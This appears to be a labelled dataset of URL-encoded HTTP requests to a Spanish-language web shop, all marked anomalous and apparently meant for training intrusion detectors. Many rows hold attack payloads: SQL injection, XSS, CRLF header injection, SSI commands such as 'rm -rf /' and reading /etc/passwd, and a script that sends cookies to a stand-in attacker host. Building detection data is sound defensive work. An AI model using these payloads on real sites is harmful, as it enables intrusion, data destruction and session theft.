text,method,label
modo=insertar&precio=3650&B1A=Confirmar,GET,anomalous
modo=registro&login=tsuji&password=envergonzado&nombre=Stylianos&apellidos=Franco+Vilamaj%F3&email=kraa%40pablobracamonte.ls&dni=65643274D&direccion=La+Pradera+131%2C+10E&ciudad=Burjassot&cp=18615&provincia=Zaragoza&ntc=1816581279872417%27OR%27a%3D%27a&B1=Registrar,GET,anomalous
modo=registro&login=tsuji&password=envergonzado&nombre=Stylianos&apellidos=Franco+Vilamaj%F3&email=kraa%40pablobracamonte.ls&dni=65643274D&direccion=La+Pradera+131%2C+10E&ciudad=Burjassot&cp=18615&provincia=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ntc=1816581279872417&B1=Registrar,GET,anomalous
modo=registro&login=tsuji&password=envergonzado&nombre=Stylianos&apellidos=Franco+Vilamaj%F3&email=kraa%40pablobracamonte.ls&dni=65643274D&direccion=La+Pradera+131%2C+10E&ciudad=Burjassot&cp=18615&provincia=Zaragoza&ntc=715846118284922&B1=Registrar,GET,anomalous
modo=registro&login=thatcher7&password=v8Imar4s8&nombre=Ebe&apellidos=Iniesta+Com%EDn&email=quensel%40guerrerodelbienestar.ke&dni=71247717L&direccion=C%2F+Lavanda%2C+81%2C+12B&ciudad=%CDscar&cp=37082%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&provincia=Madrid&ntc=3448589549551103&B1=Registrar,GET,anomalous
modo=registro&login=thatcher7&password=v8Imar4s8&nombre=Ebe&apellidos=Iniesta+Com%EDn&email=quensel%40guerrerodelbienestar.ke&dni=71247717L&direccion=C%2F+Lavanda%2C+81%2C+12B&ciudad=%CDscar&cp=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Madrid&ntc=3448589549551103&B1=Registrar,GET,anomalous
modo=registro&login=thatcher7&password=v8Imar4s8&nombre=Ebe&apellidosA=Iniesta+Com%EDn&email=quensel%40guerrerodelbienestar.ke&dni=71247717L&direccion=C%2F+Lavanda%2C+81%2C+12B&ciudad=%CDscar&cp=37082&provincia=Madrid&ntc=3448589549551103&B1=Registrar,GET,anomalous
id=3%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=100&cantidad=2&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Queso+Manchego&precio=100%2F&cantidad=2&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Queso+Manchego&precioA=100&cantidad=2&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=bagnato33&pwd=p9n4o52s0a&remember=off%2F&B1=Entrar,GET,anomalous
modo=entrar&login=bagnato33&pwdA=p9n4o52s0a&remember=on&B1=Entrar,GET,anomalous
modo=insertar&precio=%27+AND+%271%27%3D%271&B1=Confirmar,GET,anomalous
modo=insertar&precio=8345&B1=Confirmar%2F,GET,anomalous
modo=insertar&precioA=8345&B1=Confirmar,GET,anomalous
modo=registro&login=dunlap&password=d5s3748dA&nombre=Walerico&apellidos=Bartra+Bergu%EDo&email=luca8%40mobilecrm.iq&dni=41944054N&direccion=Pla%E7a+Don+Ramon+Serrano+Su%F1er%2C+S%2FN+&ciudad=Antig%FCedadany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&cp=09610&provincia=Madrid&ntc=2664915448366606&B1=Registrar,GET,anomalous
modo=registro&login=dunlap&password=d5s3748dA&nombre=Walerico&apellidos=Bartra+Bergu%EDo&email=luca8%40mobilecrm.iq&dni=41944054N&direccion=Pla%E7a+Don+Ramon+Serrano+Su%F1er%2C+S%2FN+&ciudad=Antig%FCedad&cp=09610&provincia=Madrid&ntc=2664915448366606&B1=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,GET,anomalous
modo=registro&login=dunlap&password=d5s3748dA&nombre=Alfi*o&apellidos=Bartra+Bergu%EDo&email=luca8%40mobilecrm.iq&dni=41944054N&direccion=Pla%E7a+Don+Ramon+Serrano+Su%F1er%2C+S%2FN+&ciudad=Antig%FCedad&cp=09610&provincia=Madrid&ntc=2664915448366606&B1=Registrar,GET,anomalous
modo=registro&login=dunlap&password=d5s3748dA&nombre=Walerico&apellidos=Bartra+Bergu%EDo&email=luca8%40mobilecrm.iq&dni=41944054N&direccionA=Pla%E7a+Don+Ramon+Serrano+Su%F1er%2C+S%2FN+&ciudad=Antig%FCedad&cp=09610&provincia=Madrid&ntc=2664915448366606&B1=Registrar,GET,anomalous
modo=registro&login=briard&password=ur7anismo&nombre=Vitalbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&apellidos=Bonafina+Cansino&email=gayou%40transportesvegasl.bm&dni=65630152C&direccion=C%2F+Marques+De+Lema+188+13G&ciudad=Rueda+de+Jal%F3n&cp=03510&provincia=Le%F3n&ntc=7816475254908142&B1=Registrar,GET,anomalous
modo=registro&login=briard&password=ur7anismo&nombre=Vital&apellidos=Bonafina+Cansino&email=%40%40aimarsen%40provider.%40com.mil&dni=65630152C&direccion=C%2F+Marques+De+Lema+188+13G&ciudad=Rueda+de+Jal%F3n&cp=03510&provincia=Le%F3n&ntc=7816475254908142&B1=Registrar,GET,anomalous
id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=19&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombreA=Queso+Manchego&precio=39&cantidad=19&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar%2520&login=xpm&pwd=circunfuso&remember=on&B1=Entrar,GET,anomalous
modo=entrar&login=gen%2F%2Fnie&pwd=circunfuso&remember=on&B1=Entrar,GET,anomalous
modo=entrar&loginA=xpm&pwd=circunfuso&remember=on&B1=Entrar,GET,anomalous
modo=insertar&precio=201&B1=Pasar+por+caja%2F,GET,anomalous
modo=insertar&precioA=201&B1=Confirmar,GET,anomalous
modo=registro&login=scythia&password=3389AGI48&nombre=Francesca&apellidos=Bagaria&email=hsaio%40suecas.com.ec&dni=15025159H&direccion=Carrer+Vallseca%2C+42%2C+&ciudad=Torrecilla+del+Pinar&cp=25225&provincia=Ja%E9n&ntc=2462273534930751&B1=Registrar,PUT,anomalous
modo=registro&login=scythia&password=3389AGI48&nombreA=Francesca&apellidos=Bagaria&email=hsaio%40suecas.com.ec&dni=15025159H&direccion=Carrer+Vallseca%2C+42%2C+&ciudad=Torrecilla+del+Pinar&cp=25225&provincia=Ja%E9n&ntc=2462273534930751&B1=Registrar,GET,anomalous
modo=registro&login=snuggs&password=Recie.ntE&nombre=Caritian&apellidos=Celaya+Gaytan&email=treman_worde%40pavimentosalagon.so&dni=75925253E&direccion=Carrer+Sant+Celoni+39%2C+8-H&ciudad=Cepeda+la+Mora%7C&cp=45200&provincia=Sevilla&ntc=0439326406567851&B1=Registrar,GET,anomalous
modo=registro&login=snuggs&password=Recie.ntE&nombre=Caritian&apellidos=Celaya+Gaytan&email=treman_worde%40pavimentosalagon.so&dni=75925253E&direccion=Carrer+Sant+Celoni+39%2C+8-H&ciudad=Cepeda+la+Mora&cp=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&provincia=Sevilla&ntc=0439326406567851&B1=Registrar,GET,anomalous
modo=registro&login=snuggs&password=Recie.ntE&nombre=Caritian&apellidos=Celaya+Gaytan&email=yarbrough%40ingenieriadela%40construccion%40.tk&dni=75925253E&direccion=Carrer+Sant+Celoni+39%2C+8-H&ciudad=Cepeda+la+Mora&cp=45200&provincia=Sevilla&ntc=0439326406567851&B1=Registrar,GET,anomalous
modo=registro&login=snuggs&password=Recie.ntE&nombre=Caritian&apellidos=Celaya+Gaytan&email=treman_worde%40pavimentosalagon.so&dniA=75925253E&direccion=Carrer+Sant+Celoni+39%2C+8-H&ciudad=Cepeda+la+Mora&cp=45200&provincia=Sevilla&ntc=0439326406567851&B1=Registrar,GET,anomalous
id=3%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=17&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=17&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Jam%F3n+Ib%E9rico&precioA=39&cantidad=17&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=corvo&pwd=4mbel0c11362&remember=off&B1=Entrar,PUT,anomalous
modo=entrar&login=corvo&pwd=4mbel0c11362%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&remember=off&B1=Entrar,GET,anomalous
modo=entrar&loginA=corvo&pwd=4mbel0c11362&remember=off&B1=Entrar,GET,anomalous
modo=insertar&precio=7105%22+AND+%221%22%3D%221&B1=Pasar+por+caja,GET,anomalous
modo=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&precio=7105&B1=Pasar+por+caja,GET,anomalous
modo=insertar&precio=7105&B1=Pasar+por+caja%2F,GET,anomalous
modoA=insertar&precio=7105&B1=Pasar+por+caja,GET,anomalous
modo=registro&login=yung-fu&password=8Ach35&nombre=Atico&apellidos=Farzati+Bol%E0s&email=gobert%40olvidalo.sh&dni=%27INJECTED_PARAM&direccion=Calle+Salamanca%2C+147%2C+12-C&ciudad=Llacuna%2C+La&cp=42192&provincia=La+Rioja&ntc=6202220690818816&B1=Registrar,GET,anomalous
modo=registro&login=yung-fu&password=8Ach35&nombre=Atico&apellidos=Farzati+Bol%E0s&email=gobert%40olvidalo.sh&dni=87238782N&direccion=Calle+Salamanca%2C+147%2C+12-C&ciudad=Llacuna%2C+La&cp=42192&provincia=La+Rioja&ntc=434921604510901A&B1=Registrar,GET,anomalous
modo=registro&login=yung-fu&password=8Ach35&nombre=Atico&apellidos=Farzati+Bol%E0s&email=gobert%40olvidalo.sh&dni=87238782N&direccion=Calle+Salamanca%2C+147%2C+12-C&ciudad=Llacuna%2C+La&cp=42192&provinciaA=La+Rioja&ntc=6202220690818816&B1=Registrar,GET,anomalous
modo=registro&login=dongmoon&password=setentavo&nombre=Naiara&apellidos=Ballester+Alumbreo&email=demjanenko%40gesautonomos.io&dni=56050614M&direccion=C%2F+Colon+123%2C+6%3FC&ciudad=Palau+de+Sa*nta+Eul%E0l%2Fia&cp=43143&provincia=Lugo&ntc=6967344603029050&B1=Registrar,GET,anomalous
modo=registro&login=dongmoon&password=setentavo&nombre=Naiara&apellidos=Ballester+Alumbreo&email=demjanenko%40gesautonomos.io&dni=56050614M&direccion=C%2F+Colon+123%2C+6%3FC&ciudad=Cantalapiedra&cp=43143&provincia=Lugo&ntcA=6967344603029050&B1=Registrar,GET,anomalous
id=2&nombre=Ques%2Bo+Manchego&precio=39&cantidad=65&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Vino+Rioja&precio=39&cantidadA=65&B1=A%F1adir+al+carrito,GET,anomalous
modo=%2520&login=doraine&pwd=paRra&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=doraine&pwd=%2C%2Ca%F15&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=doraine&pwd=paRra&rememberA=off&B1=Entrar,GET,anomalous
id=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,GET,anomalous
modo=insertar&precioA=9857&B1=Pasar+por+caja,GET,anomalous
modo=registro&login=prudi65&password=trenzar&nombre=Anatolio&apellidos=Comello+Villasev&email=numani%40deuxmanagement.io&dni=74498414B&direccion=Illa+Digna+98+1%3FH&ciudad=Driebes&cp=37794&provincia=La+Rioja&ntc=4126065291038151&B1A=Registrar,GET,anomalous
modo=registro&login=austin&password=va%ED6A&nombre=Dami%E1n&apellidos=Haddock&email=ryder%40mataluenga.zm&dni=12773567B&direccion=Oasis%2C+89+&ciudad=Y%E9meda&cp=42181&provincia=A+Coru%F1a%257C&ntc=1457291251258810&B1=Registrar,GET,anomalous
modo=registro&login=austin&password=va%ED6A&nombre=Dami%E1n&apellidos=Haddock&email=herndon%40coches%40a%40utoma%40ticos.il&dni=12773567B&direccion=Oasis%2C+89+&ciudad=Y%E9meda&cp=42181&provincia=A+Coru%F1a&ntc=1457291251258810&B1=Registrar,GET,anomalous
modo=registro&login=austin&password=va%ED6A&nombre=Dami%E1n&apellidos=Haddock&emailA=ryder%40mataluenga.zm&dni=12773567B&direccion=Oasis%2C+89+&ciudad=Y%E9meda&cp=42181&provincia=A+Coru%F1a&ntc=1457291251258810&B1=Registrar,GET,anomalous
id=1&nombre=Vino+Rioja%27INJECTED_PARAM&precio=85&cantidad=7&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=85&cantidad=7&B1=A%F1adir+al+carrito,GET,anomalous
id=1&nombre=Vino+Rioja&precio=85&cantidad=7&B1A=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=nezm&pwd=1Eb5l0e&remember=off&B1=Entrar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,GET,anomalous
modo=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&login=nezm&pwd=1Eb5l0e&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=ro%2B%3Fsemari&pwd=1Eb5l0e&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=nezm&pwd=1Eb5l0e&remember=off&B1A=Entrar,GET,anomalous
modo=insertar&precio=810&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,GET,anomalous
modo=insertar&precio=810&B1=Confirmar%2F,GET,anomalous
modoA=insertar&precio=810&B1=Confirmar,GET,anomalous
modo=registro&login=bourk&password=acoMoDamIEnTO&nombre=Rafferty%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&apellidos=Aca+Isach&email=lafuret%40cortinas-de-aire.ai&dni=56038958X&direccion=Gijon%2C+93%2C+6%3FE&ciudad=Pozuelo&cp=41749&provincia=Barcelona&ntc=4929562421029680&B1=Registrar,GET,anomalous
modo=registro&login=bourk&password=acoMoDamIEnTO&nombre=Rafferty&apellidos=_Es%3Fcribano+Gou&email=lafuret%40cortinas-de-aire.ai&dni=56038958X&direccion=Gijon%2C+93%2C+6%3FE&ciudad=Pozuelo&cp=41749&provincia=Barcelona&ntc=4929562421029680&B1=Registrar,GET,anomalous
modo=registro&login=elefther&password=a_ma6ar&nombre=Dacil&apellidos=Bon%EDas+Aleza&email=mallalie%40u%40logiteclin%40es.%40ly&dni=41273299Y&direccion=Lucas+Mallada%2C+28%2C+&ciudad=Cantalpino&cp=34469&provincia=Guip%FAzcoa&ntc=7363123052285144&B1=Registrar,GET,anomalous
modo=registro&login=elefther&password=a_ma6ar&nombre=Dacil&apellidos=Bon%EDas+Aleza&emailA=kohner_daikos%40zarahealth.mk&dni=41273299Y&direccion=Lucas+Mallada%2C+28%2C+&ciudad=Cantalpino&cp=34469&provincia=Guip%FAzcoa&ntc=7363123052285144&B1=Registrar,GET,anomalous
id=3%27+DELETE+FROM+USERS&nombre=Queso+Manchego&precio=100&cantidad=14&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Queso+Manchego&precio=85%2F&cantidad=14&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Queso+Manchego&precio=100&cantidad=14&B1A=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=briney&pwd=concesa&remember=on%2F&B1=Entrar,GET,anomalous
modo=entrar&login=briney&pwd=concesa&rememberA=off&B1=Entrar,GET,anomalous
modo=insertar&precio=8041&B1=Pasar+por+caja%2520,GET,anomalous
modo=insertar&precio=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Pasar+por+caja,GET,anomalous
modo=insertar&precio=8041&B1=Pasar+por+caja%2F,GET,anomalous
modoA=insertar&precio=8041&B1=Pasar+por+caja,GET,anomalous
modo=registrosessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&login=wendy&password=a-h%EDlo&nombre=Edelvais&apellidos=Alba%F1il+Comasoli&email=raidhi_altermen%40prestamosypersonales.kw&dni=68675744K&direccion=Puerto+De+Canfranc+179%2C+&ciudad=Mont%F3n&cp=12415&provincia=Guadalajara&ntc=8960280484576559&B1=Registrar,GET,anomalous
modo=registro&login=wendy&password=a-h%EDlo&nombre=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&apellidos=Alba%F1il+Comasoli&email=raidhi_altermen%40prestamosypersonales.kw&dni=68675744K&direccion=Puerto+De+Canfranc+179%2C+&ciudad=Mont%F3n&cp=12415&provincia=Guadalajara&ntc=8960280484576559&B1=Registrar,GET,anomalous
modo=registro&login=wendy&password=a-h%EDlo&nombre=Edelvais&apellidos=Alba%F1il+Comasoli&email=%40ha%40nks%40raullaza%40ro.mc&dni=68675744K&direccion=Puerto+De+Canfranc+179%2C+&ciudad=Mont%F3n&cp=12415&provincia=Guadalajara&ntc=8960280484576559&B1=Registrar,GET,anomalous
modo=registro&login=wendy&password=a-h%EDlo&nombre=Edelvais&apellidos=Alba%F1il+Comasoli&email=raidhi_altermen%40prestamosypersonales.kw&dni=68675744K&direccion=Puerto+De+Canfranc+179%2C+&ciudad=Mont%F3n&cp=12415&provinciaA=Guadalajara&ntc=8960280484576559&B1=Registrar,GET,anomalous
modo=registro&login=falcao2&password=AND+1%3D1&nombre=Yago&apellidos=Barbou&email=carey%40x2.com.th&dni=91059337Z&direccion=Carrer+Bruselles+112+1C&ciudad=Arraya+de+Oca&cp=44591&provincia=Barcelona&ntc=1504583168402785&B1=Registrar,GET,anomalous
modo=registro&login=falcao2&password=gayera&nombre=Yago&apellidos=Blas%2Bco+Barq-u.in&email=carey%40x2.com.th&dni=91059337Z&direccion=Carrer+Bruselles+112+1C&ciudad=Arraya+de+Oca&cp=44591&provincia=Barcelona&ntc=1504583168402785&B1=Registrar,GET,anomalous
modo=registro&login=falcao2&password=gayera&nombre=Yago&apellidos=Barbou&email=carey%40x2.com.th&dni=91059337Z&direccionA=Carrer+Bruselles+112+1C&ciudad=Arraya+de+Oca&cp=44591&provincia=Barcelona&ntc=1504583168402785&B1=Registrar,GET,anomalous
id=3%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&nombre=Vino+Rioja&precio=39&cantidad=34&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=39&cantidad=34&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombre=Vino+Rioja&precio=39&cantidadA=34&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=dilen&pwd=%252B&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=woins%3Fky&pwd=pagaDEra&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=dilen&pwdA=pagaDEra&remember=off&B1=Entrar,GET,anomalous
modo=insertar&precio=1599&B1=Confirmar%252B,GET,anomalous
modo=insertar&precio=1599&B1=Pasar+por+caja%2F,GET,anomalous
modo=insertar&precio=1599&B1A=Confirmar,GET,anomalous
modo=registro&login=tobye&password=car40m20ci8&nombre=Amaro&apellidos=Brunori&email=esham%40cpanelweb.com.bv&dni=22205546N&direccion=Avda.+Aldehuela%2C+9+13-H&ciudad=Torlengua&cp=02510&provincia=Palencia&ntc=5917432990420378&B1=%27+AND+%271%27%3D%271,GET,anomalous
modo=registro&login=tobye&password=car40m20ci8&nombre=Amaro&apellidos=Brunori&email=esham%40cpanelweb.com.bv&dni=22205546N&direccion=Avda.+Aldehuela%2C+9+13-H&ciudadA=Torlengua&cp=02510&provincia=Palencia&ntc=5917432990420378&B1=Registrar,GET,anomalous
modo=registro&login=izique&password=48a6850ll3&nombre=Otilia&apellidos=Planelles+Neris&email=divoka%40mercadozoom.bf%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&dni=36504708M&direccion=Calle+Bolivia%2C+69%2C+&ciudad=Avil%E9s&cp=22468&provincia=Le%F3n&ntc=1926544477784446&B1=Registrar,GET,anomalous
modo=registro&login=izique&password=48a6850ll3&nombre=Otilia&apellidos=Aliverti_+Sanandre%3Fu&email=divoka%40mercadozoom.bf&dni=36504708M&direccion=Calle+Bolivia%2C+69%2C+&ciudad=Avil%E9s&cp=22468&provincia=Le%F3n&ntc=1926544477784446&B1=Registrar,GET,anomalous
modo=registro&login=izique&password=48a6850ll3&nombreA=Otilia&apellidos=Planelles+Neris&email=divoka%40mercadozoom.bf&dni=36504708M&direccion=Calle+Bolivia%2C+69%2C+&ciudad=Avil%E9s&cp=22468&provincia=Le%F3n&ntc=1926544477784446&B1=Registrar,GET,anomalous
id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=77&B1=A%F1adir+al+carrito,GET,anomalous
id=3&nombreA=Vino+Rioja&precio=100&cantidad=77&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=macmulli6&pwd=imp1o%2Cnunci0%2Cb%27le&remember=on&B1=Entrar,GET,anomalous
modo=entrar&loginA=macmulli6&pwd=A1391%2B18u46&remember=on&B1=Entrar,GET,anomalous
modo=insertar&precio=3546&B1=Pasar+por+caja%2F,GET,anomalous
modoA=insertar&precio=3546&B1=Confirmar,GET,anomalous
modo=registro&login=alix&password=venI%21A&nombre=Imelda&apellidos=Delb%F3n+Coll&email=holister%40brunoseguridad.cf&dni=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&direccion=Plza.+Noria+De+La+Huerta+68%2C+&ciudad=Alcudia+de+Veo&cp=28690&provincia=%C1vila&ntc=6551003767368321&B1=Registrar,GET,anomalous
modo=registro&login=alix&password=venI%21A&nombre=Imelda&apellidos=Delb%F3n+Coll&email=holister%40brunoseguridad.cf&dni=80525673M&direccion=Plza.+Noria+De+La+Huerta+68%2C+&ciudad=Alcudia+de+Veo&cp=28690&provincia=Alba%2Fc%2Fete&ntc=6551003767368321&B1=Registrar,GET,anomalous
modo=registro&login=alix&password=venI%21A&nombreA=Imelda&apellidos=Delb%F3n+Coll&email=holister%40brunoseguridad.cf&dni=80525673M&direccion=Plza.+Noria+De+La+Huerta+68%2C+&ciudad=Alcudia+de+Veo&cp=28690&provincia=%C1vila&ntc=6551003767368321&B1=Registrar,GET,anomalous
modo=registro&login=publicat&password=12l4rO&nombre=Froil%E1n&apellidos=Arenzana+Carrafa&email=bane%40juegosgratisinternet.nr&dni=08530797M&direccion=Calle+Angel+Mu%F1iz+Toca%2C+16*%2B1+&ciudad=Santib%E1%F1ez+de+Vidriales&cp=10815&provincia=Granada&ntc=0788909004705438&B1=Registrar,GET,anomalous
modo=registro&login=publicat&password=12l4rO&nombre=Froil%E1n&apellidos=Arenzana+Carrafa&email=bane%40juegosgratisinternet.nr&dniA=08530797M&direccion=C%2F+Kanala%2C+15+&ciudad=Santib%E1%F1ez+de+Vidriales&cp=10815&provincia=Granada&ntc=0788909004705438&B1=Registrar,GET,anomalous
id=2&nombre=Vino+Rioja&precio=85%7C&cantidad=67&B1=A%F1adir+al+carrito,GET,anomalous
id=2&nombre=Vino+Rioja&precio=39%2F&cantidad=67&B1=A%F1adir+al+carrito,GET,anomalous
idA=2&nombre=Vino+Rioja&precio=85&cantidad=67&B1=A%F1adir+al+carrito,GET,anomalous
modo=entrar&login=romani%253F&pwd=examEN&remember=off&B1=Entrar,GET,anomalous
modo=entrar&login=romani&pwd=examEN&remember=off%2F&B1=Entrar,GET,anomalous
modo=entrar&login=romani&pwdA=examEN&remember=off&B1=Entrar,GET,anomalous
modo=insertar&precio=8064any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&B1=Confirmar,GET,anomalous
modo=insertar&precio=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&B1=Confirmar,GET,anomalous
modo=insertar&precio=8064&B1=Confirmar%2F,GET,anomalous
modo=registro&login=arcouet&password=man17lme73e&nombre=Landelina&apellidos=Dangla+Llobera&email=grimaud%40vi%F1avilano.bu&dni=17030732Z&direccion=Calle+Santa+Maria%2C+38%2C+9A&ciudad=Santa+Gadea+del+Cid&cp=08560&provincia=Palenciabob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ntc=5358171636012894&B1=Registrar,GET,anomalous
modo=registro&login=arcouet&password=man17lme73e&nombre=Landelina&apellidos=Gaytan+_Bayano&email=grimaud%40vi%F1avilano.bu&dni=17030732Z&direccion=Calle+Santa+Maria%2C+38%2C+9A&ciudad=Santa+Gadea+del+Cid&cp=08560&provincia=Palencia&ntc=5358171636012894&B1=Registrar,GET,anomalous
modo=registro&loginA=arcouet&password=man17lme73e&nombre=Landelina&apellidos=Dangla+Llobera&email=grimaud%40vi%F1avilano.bu&dni=17030732Z&direccion=Calle+Santa+Maria%2C+38%2C+9A&ciudad=Santa+Gadea+del+Cid&cp=08560&provincia=Palencia&ntc=5358171636012894&B1=Registrar,GET,anomalous
